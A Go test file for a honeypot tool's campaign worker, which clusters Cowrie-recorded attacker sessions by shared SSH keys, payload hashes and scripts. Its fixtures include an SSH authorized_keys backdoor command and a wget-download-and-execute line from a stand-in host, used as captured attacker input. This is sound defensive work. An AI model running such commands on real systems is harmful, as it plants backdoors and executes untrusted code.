package campaign

import (
	"context"
	"database/sql"
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/networkshard/shardlure/internal/store"
	"github.com/networkshard/shardlure/pkg/models"
)

const outlawCmd = `cd ~; chattr -ia .ssh; rm -rf .ssh && mkdir .ssh && echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKBT1fubDzcjP8Ntf33MZwaTgCpwTQRaj7IrSvXO0lBU mdrfckr" >> .ssh/authorized_keys`

func openStore(t *testing.T) *store.Store {
	t.Helper()
	st, err := store.Open(filepath.Join(t.TempDir(), "w.db"))
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { st.Close() })
	return st
}

func insertSharedKey(t *testing.T, st *store.Store, actors ...string) {
	t.Helper()
	for i, a := range actors {
		if err := st.InsertEvent(&models.Event{TS: time.Now().UTC().Add(-time.Hour), Source: models.SourceCowrie, Kind: models.KindCommand,
			SessionID: fmt.Sprintf("s%d", i), ActorID: a, SrcIP: "198.51.100.1", Command: outlawCmd}); err != nil {
			t.Fatal(err)
		}
	}
}

func TestWorkerBuildsCampaignFromSharedKey(t *testing.T) {
	st, err := store.Open(filepath.Join(t.TempDir(), "w.db"))
	if err != nil {
		t.Fatal(err)
	}
	defer st.Close()
	for i, a := range []string{"cowrie:a", "cowrie:b"} {
		if err := st.InsertEvent(&models.Event{TS: time.Now().UTC().Add(-time.Hour), Source: models.SourceCowrie, Kind: models.KindCommand,
			SessionID: fmt.Sprintf("s%d", i), ActorID: a, SrcIP: "198.51.100.1", Command: outlawCmd}); err != nil {
			t.Fatal(err)
		}
	}
	w := NewWorker(st, 90, t.TempDir())
	if err := w.Tick(context.Background()); err != nil {
		t.Fatal(err)
	}
	list, err := st.ListCampaigns(context.Background(), 10)
	if err != nil || len(list) != 1 || list[0].Actors != 2 {
		t.Fatalf("campaigns %+v %v", list, err)
	}
}

func TestPayloadAndCommonFilters(t *testing.T) {
	now := time.Now().UTC()
	row := func(kind, value, session, actor string, size int64) store.EvidenceRow {
		return store.EvidenceRow{Kind: kind, Value: value, SessionID: session, ActorID: actor, IP: "i", FirstSeen: now, LastSeen: now, SizeBytes: size}
	}
	ev := []store.EvidenceRow{
		row("payload", "unknown", "s1", "a", -1), row("payload", "unknown", "s2", "b", -1), // unknown size: fail closed
		row("payload", "tiny", "s1", "a", 8), row("payload", "tiny", "s2", "b", 8),
		row("payload", "miner", "s1", "a", 5000), row("payload", "miner", "s2", "b", 5000),
		row("payload", "good", "s1", "a", 5000), row("payload", "good", "s2", "b", 5000),
	}
	for i := 0; i < 30; i++ { // a key used by 30 actors is common
		ev = append(ev, row("ssh_key", "SHA256:kit", fmt.Sprintf("k%d", i), fmt.Sprintf("actor%d", i), -1))
	}
	fam := map[string]string{"miner": "coinminer"}
	got := linkingOccurrences(ev, nil, 5000, func(sha string) string { return fam[sha] })
	for _, o := range got {
		if o.Value != "good" {
			t.Fatalf("value %q must not link", o.Value)
		}
	}
	if len(got) != 2 {
		t.Fatalf("got %d occurrences", len(got))
	}
}

// The payload rule and the never-link kinds, beyond the brief's fixture: the
// empty-file hash, the classifier's mixed-case "XMRig", a payload that could
// not be classified at all, and context-only kinds.
func TestLinkingRulesRejectContextAndUnclassified(t *testing.T) {
	now := time.Now().UTC()
	pair := func(kind, value string, size int64) []store.EvidenceRow {
		return []store.EvidenceRow{
			{Kind: kind, Value: value, SessionID: "s1", ActorID: "a", IP: "i", FirstSeen: now, LastSeen: now, SizeBytes: size},
			{Kind: kind, Value: value, SessionID: "s2", ActorID: "b", IP: "i", FirstSeen: now, LastSeen: now, SizeBytes: size},
		}
	}
	var ev []store.EvidenceRow
	ev = append(ev, pair("payload", emptyFileSHA256, 5000)...)
	ev = append(ev, pair("payload", "xmrig", 5000)...)
	ev = append(ev, pair("payload", "unreadable", 5000)...)
	ev = append(ev, pair("payload", "redtail", 5000)...)
	ev = append(ev, pair("hassh", "h1", -1)...)
	ev = append(ev, pair("client", "SSH-2.0-Go", -1)...)
	ev = append(ev, pair("host", "203.0.113.9", -1)...)
	fam := map[string]string{"xmrig": "XMRig", "unreadable": unclassified, "redtail": "redtail"}
	got := linkingOccurrences(ev, nil, 5000, func(sha string) string { return fam[sha] })
	if len(got) != 2 || got[0].Value != "redtail" || got[0].Family != "redtail" {
		t.Fatalf("got %+v", got)
	}
}

func TestScriptsLinkOnlyThroughLinkDecision(t *testing.T) {
	now := time.Now().UTC()
	occ := func(fp, session, actor string, distinctive bool) store.ScriptOccRow {
		return store.ScriptOccRow{Fingerprint: fp, SessionID: session, ActorID: actor, IP: "i", FirstSeen: now, LastSeen: now, Distinctive: distinctive}
	}
	scripts := []store.ScriptOccRow{
		occ("recon", "s1", "a", false), occ("recon", "s2", "b", false),
		occ("tool", "s1", "a", true), occ("tool", "s2", "b", true),
	}
	for i := 0; i < 30; i++ {
		scripts = append(scripts, occ("everyone", fmt.Sprintf("e%d", i), fmt.Sprintf("actor%d", i), true))
	}
	got := linkingOccurrences(nil, scripts, 5000, func(string) string { return "" })
	if len(got) != 2 || got[0].Value != "tool" || got[0].Kind != "script" {
		t.Fatalf("got %+v", got)
	}
}

func TestWorkerBacksOffAfterFailure(t *testing.T) {
	st, err := store.Open(filepath.Join(t.TempDir(), "b.db"))
	if err != nil {
		t.Fatal(err)
	}
	w := NewWorker(st, 90, t.TempDir())
	st.Close() // every query now fails
	if err := w.Tick(context.Background()); err == nil {
		t.Fatal("expected failure")
	}
	if err := w.Tick(context.Background()); err != nil {
		t.Fatalf("tick inside the backoff window must be a no-op, got %v", err)
	}
}

// An edit appended after Regroup read the edit log but before it saved must
// make the save refuse (ErrStaleGrouping), and the next regroup applies it.
func TestStaleSaveIsRefusedAndNextRegroupIncludesEdit(t *testing.T) {
	st := openStore(t)
	insertSharedKey(t, st, "cowrie:a", "cowrie:b")
	ctx := context.Background()
	w := NewWorker(st, 90, t.TempDir())
	if err := w.Tick(ctx); err != nil {
		t.Fatal(err)
	}
	list, err := st.ListCampaigns(ctx, 10)
	if err != nil || len(list) != 1 {
		t.Fatalf("campaigns %+v %v", list, err)
	}
	id := list[0].ID
	beforeSave = func() {
		beforeSave = nil
		if err := st.AppendCampaignEdit(ctx, id, "rename", "Racing Rename", "test"); err != nil {
			t.Error(err)
		}
	}
	t.Cleanup(func() { beforeSave = nil })
	if err := w.Regroup(ctx); !errors.Is(err, store.ErrStaleGrouping) {
		t.Fatalf("Regroup = %v, want ErrStaleGrouping", err)
	}
	if list, _ := st.ListCampaigns(ctx, 10); len(list) != 1 || list[0].Name != "" {
		t.Fatalf("stale grouping was saved: %+v", list)
	}
	if err := w.Regroup(ctx); err != nil {
		t.Fatal(err)
	}
	if list, _ := st.ListCampaigns(ctx, 10); len(list) != 1 || list[0].Name != "Racing Rename" {
		t.Fatalf("edit not applied by the next regroup: %+v", list)
	}
}

// Through Tick, a stale save is not a failure: no error, no backoff, and the
// very next tick regroups.
func TestTickTreatsStaleSaveAsRetryNotFailure(t *testing.T) {
	st := openStore(t)
	insertSharedKey(t, st, "cowrie:a", "cowrie:b")
	ctx := context.Background()
	w := NewWorker(st, 90, t.TempDir())
	if err := w.Tick(ctx); err != nil {
		t.Fatal(err)
	}
	list, _ := st.ListCampaigns(ctx, 10)
	id := list[0].ID
	beforeSave = func() {
		beforeSave = nil
		if err := st.AppendCampaignEdit(ctx, id, "rename", "Second", "test"); err != nil {
			t.Error(err)
		}
	}
	t.Cleanup(func() { beforeSave = nil })
	w.Wake()
	if err := w.Tick(ctx); err != nil {
		t.Fatalf("stale save surfaced as failure: %v", err)
	}
	if !w.retryAt.IsZero() && time.Now().Before(w.retryAt) {
		t.Fatal("stale save started a backoff")
	}
	if err := w.Tick(ctx); err != nil {
		t.Fatal(err)
	}
	if list, _ := st.ListCampaigns(ctx, 10); len(list) != 1 || list[0].Name != "Second" {
		t.Fatalf("next tick did not regroup: %+v", list)
	}
}

// Wake regroups on the next tick; without it an edit waits for the 10-minute
// schedule.
func TestWakeRegroupsWithinOneTick(t *testing.T) {
	st := openStore(t)
	insertSharedKey(t, st, "cowrie:a", "cowrie:b")
	ctx := context.Background()
	w := NewWorker(st, 90, t.TempDir())
	if err := w.Tick(ctx); err != nil {
		t.Fatal(err)
	}
	list, _ := st.ListCampaigns(ctx, 10)
	if err := st.AppendCampaignEdit(ctx, list[0].ID, "rename", "Outlaw", "test"); err != nil {
		t.Fatal(err)
	}
	if err := w.Tick(ctx); err != nil {
		t.Fatal(err)
	}
	if list, _ := st.ListCampaigns(ctx, 10); list[0].Name != "" {
		t.Fatalf("regrouped without a wake or schedule: %+v", list)
	}
	w.Wake()
	if err := w.Tick(ctx); err != nil {
		t.Fatal(err)
	}
	if list, _ := st.ListCampaigns(ctx, 10); list[0].Name != "Outlaw" {
		t.Fatalf("wake did not regroup: %+v", list)
	}
}

// SaveGrouping rejects the whole grouping on an empty field, so the mapping
// must never produce one: nil reasons become "[]".
func TestGroupingRowsNeverCarryEmptyReasons(t *testing.T) {
	out := Output{Campaigns: []Campaign{{ID: "c-1", Members: []Member{{ActorID: "cowrie:a"}}}}}
	rows, _ := groupingRows(out)
	if rows[0].Members[0].Reasons != "[]" || rows[0].Actors != 1 {
		t.Fatalf("rows %+v", rows)
	}
}

func TestFamilyOfOnlyReadsInsideEvidenceRoot(t *testing.T) {
	st := openStore(t)
	ctx := context.Background()
	root := t.TempDir()
	outside := t.TempDir()
	write := func(p string) {
		if err := os.WriteFile(p, []byte("#!/bin/sh\necho payload\n"), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	inside := filepath.Join(root, "in.bin")
	write(inside)
	away := filepath.Join(outside, "away.bin")
	write(away)
	link := filepath.Join(root, "link.bin")
	if err := os.Symlink(away, link); err != nil {
		t.Fatal(err)
	}
	for sha, p := range map[string]string{"aa": inside, "bb": away, "cc": link} {
		if err := st.RecordArtifact(store.Artifact{TS: time.Now().UTC(), SHA256: sha, LocalPath: p, SizeBytes: 100, Status: "fetched", Origin: "cowrie_download", URL: "cowrie-download:" + sha}); err != nil {
			t.Fatal(err)
		}
	}
	var read []string
	w := NewWorker(st, 90, root)
	w.classify = func(p string) (string, error) { read = append(read, p); return "RedTail", nil }
	if f := w.familyOf(ctx, "aa"); f != "redtail" {
		t.Fatalf("inside family %q", f)
	}
	if f := w.familyOf(ctx, "bb"); f != unclassified {
		t.Fatalf("outside file classified: %q", f)
	}
	if f := w.familyOf(ctx, "cc"); f != unclassified {
		t.Fatalf("symlink escaping the root classified: %q", f)
	}
	if f := w.familyOf(ctx, "missing"); f != unclassified {
		t.Fatalf("missing artifact: %q", f)
	}
	if len(read) != 1 {
		t.Fatalf("classifier read %v", read)
	}
	noRoot := NewWorker(st, 90, "")
	noRoot.classify = w.classify
	if f := noRoot.familyOf(ctx, "aa"); f != unclassified || len(read) != 1 {
		t.Fatalf("no evidence root must not read files: %q %v", f, read)
	}
}

// A backlog reappearing after the first drain (a replace-ingest re-inserts its
// rows above the parked cursor, or a burst larger than one window) makes scheduled regroups wait
// for it again; a Wake still regroups at once.
func TestBacklogAfterDrainDefersScheduledRegroup(t *testing.T) {
	st := openStore(t)
	insertSharedKey(t, st, "cowrie:a", "cowrie:b")
	ctx := context.Background()
	w := NewWorker(st, 90, t.TempDir())
	if err := w.Tick(ctx); err != nil {
		t.Fatal(err)
	}
	if !w.drained {
		t.Fatal("initial backlog not drained")
	}
	for i := 0; i < 3; i++ {
		if err := st.InsertEvent(&models.Event{TS: time.Now().UTC(), Source: models.SourceCowrie, Kind: models.KindCommand,
			SessionID: fmt.Sprintf("late%d", i), ActorID: "cowrie:c", SrcIP: "198.51.100.2", Command: "uname -a"}); err != nil {
			t.Fatal(err)
		}
	}
	w.window, w.maxWindows = 1, 1
	w.lastGroup = time.Now().Add(-time.Hour) // the schedule alone would be due
	if err := w.Tick(ctx); err != nil {
		t.Fatal(err)
	}
	if w.drained || w.lastGroup.After(time.Now().Add(-time.Minute)) {
		t.Fatalf("scheduled regroup ran during a backlog: drained=%v lastGroup=%v", w.drained, w.lastGroup)
	}
	w.Wake()
	if err := w.Tick(ctx); err != nil {
		t.Fatal(err)
	}
	if w.lastGroup.Before(time.Now().Add(-time.Minute)) {
		t.Fatal("wake did not regroup during a backlog")
	}
	w.window, w.maxWindows = recordWindow, maxWindowsPerTick
	if err := w.Tick(ctx); err != nil {
		t.Fatal(err)
	}
	if !w.drained || w.pending {
		t.Fatalf("drain did not trigger the owed regroup: drained=%v pending=%v", w.drained, w.pending)
	}
}

// A cancelled regroup never classifies: familyOf fails closed.
func TestFamilyOfFailsClosedOnCancel(t *testing.T) {
	st := openStore(t)
	w := NewWorker(st, 90, t.TempDir())
	w.classify = func(string) (string, error) { t.Fatal("classified after cancel"); return "", nil }
	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	if f := w.familyOf(ctx, "aa"); f != unclassified {
		t.Fatalf("family %q", f)
	}
}

// PruneOrphanScripts is a DELETE ... WHERE NOT EXISTS scan under writeMu.
// Orphans only arise when a session settles under a new fingerprint or a
// regroup rebuilds families, so an idle tick must not take the writer lock
// for it; a tick that settled or regrouped still prunes.
func TestPruneRunsOnlyAfterSettleOrRegroup(t *testing.T) {
	st := openStore(t)
	ctx := context.Background()
	insertSharedKey(t, st, "cowrie:a", "cowrie:b")
	w := NewWorker(st, 90, t.TempDir())
	if err := w.Tick(ctx); err != nil { // drains the backlog and regroups
		t.Fatal(err)
	}
	// An orphan script: a settled session whose rows retention then removed
	// (the purge leaves scripts to the worker's prune).
	old := time.Now().UTC().AddDate(0, 0, -120)
	if err := st.InsertEvent(&models.Event{TS: old, Source: models.SourceCowrie, Kind: models.KindCommand, SessionID: "orph",
		ActorID: "cowrie:z", SrcIP: "198.51.100.9", Command: "cd /tmp; wget http://x/y; chmod +x y; ./y; rm y"}); err != nil {
		t.Fatal(err)
	}
	if _, err := st.RecordCampaignEvidence(ctx, 5000); err != nil {
		t.Fatal(err)
	}
	if n, err := st.SettleSessionScripts(ctx, time.Now().Add(time.Hour), 10); err != nil || n < 1 {
		t.Fatalf("settle n=%d err=%v", n, err)
	}
	rows, err := st.SettledScriptRows(ctx)
	if err != nil {
		t.Fatal(err)
	}
	var fp string
	for _, r := range rows {
		if r.SessionID == "orph" {
			fp = r.Fingerprint
		}
	}
	if fp == "" {
		t.Fatal("orph did not settle")
	}
	if err := st.MaintenancePurge(90); err != nil {
		t.Fatal(err)
	}
	if _, err := st.GetScript(ctx, fp); err != nil {
		t.Fatalf("orphan script must exist before the tick: %v", err)
	}
	if err := w.Tick(ctx); err != nil { // nothing to record, settle or regroup
		t.Fatal(err)
	}
	if _, err := st.GetScript(ctx, fp); err != nil {
		t.Fatalf("an idle tick pruned (took writeMu for nothing): %v", err)
	}
	w.Wake()
	if err := w.Tick(ctx); err != nil { // regroups, so the gate opens
		t.Fatal(err)
	}
	if _, err := st.GetScript(ctx, fp); !errors.Is(err, sql.ErrNoRows) {
		t.Fatalf("orphan survived a regroup tick: %v", err)
	}
}

// Rows the recorder drops for an unusable timestamp are reported, not lost
// silently: the tick logs how many it skipped.
func TestTickLogsSkippedTimestamps(t *testing.T) {
	path := filepath.Join(t.TempDir(), "skip.db")
	st, err := store.Open(path)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { st.Close() })
	insertSharedKey(t, st, "cowrie:a", "cowrie:b")
	raw, err := sql.Open("sqlite", path)
	if err != nil {
		t.Fatal(err)
	}
	defer raw.Close()
	if _, err := raw.Exec(`UPDATE events SET ts='garbage', ts_unix_ns=NULL WHERE session_id='s1'`); err != nil {
		t.Fatal(err)
	}
	var logged []string
	old := logf
	logf = func(format string, args ...any) { logged = append(logged, fmt.Sprintf(format, args...)) }
	t.Cleanup(func() { logf = old })
	if err := NewWorker(st, 90, t.TempDir()).Tick(context.Background()); err != nil {
		t.Fatal(err)
	}
	if len(logged) != 1 || !strings.Contains(logged[0], "skipped 1 ") {
		t.Fatalf("logged %q", logged)
	}
}
